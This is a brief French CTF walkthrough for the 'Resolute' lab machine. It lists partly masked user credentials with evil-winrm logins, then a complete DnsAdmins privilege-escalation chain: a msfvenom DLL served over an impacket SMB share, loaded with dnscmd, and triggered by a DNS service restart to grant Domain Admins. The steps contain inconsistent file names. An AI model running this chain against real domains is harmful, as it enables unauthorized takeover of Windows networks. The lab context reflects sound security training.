

# Resolute

```

user owner :
melanie password: Welxxxxxxxxxxxxx location : enum4linux dans la machine de l'attaquant
evil-winrm -i 10.10.10.169/MEGABANK -u melanie -p Welxxxxxxxxxxxxxxxx
ryan password  : Servxxxxxxxxxxxxxx  location : c:\pstranscript
evil-winrm -i 10.10.10.169/MEGABANK -u ryan -p Servxxxxxxxxxxxxx


root owner : 
- lancer serveur smb après avoir installé impacket : python smbserver.py name_share /home/Resolut   
(mitos est le nom du share et /home/resolut est le path du fichier généré par msfvenom dans mon cas c'est dnsme.dll) 
ce dnsme.dll est créé par la commande : msfvenom -p windows/x64/exec cmd="net group 'domain admins' melanie /add /domain" -f dll > dnsme.dl
- sur la machine victime : 
   - on vérifie d'abord que ryan est membre du dnsadmins, avec la commande net user ryan 
   (on remarque q'il est membre de contractors qui est membre de dnsadmins. si ryan n'est pas membre on ne peut rien faire)
   - dnscmd /config /serverlevelplugindll //adresss/name_share/dnsmee.dll
   - sc.exe stop dns
   - sc.exe start dns
   - on tape net user melanie et on trouve qu'elle a été ajoutéé au groupe "domaine admins"
   - on accède au C:/users/administrator/desktop/root.txt
```
